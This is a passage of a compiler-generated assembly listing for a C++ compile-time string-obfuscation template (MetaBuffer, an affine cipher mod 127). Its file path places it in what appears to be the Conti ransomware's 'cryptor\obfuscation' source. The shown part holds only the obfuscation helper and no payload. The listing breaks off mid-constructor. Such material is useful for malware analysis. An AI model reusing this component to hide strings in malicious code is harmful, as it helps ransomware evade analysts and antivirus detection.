?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 13	 imul	 eax, eax, 19
  0002d	83 c0 5c	 add	 eax, 92			; 0000005cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1a	 cmp	 QWORD PTR i$1[rbp], 26
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv280 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
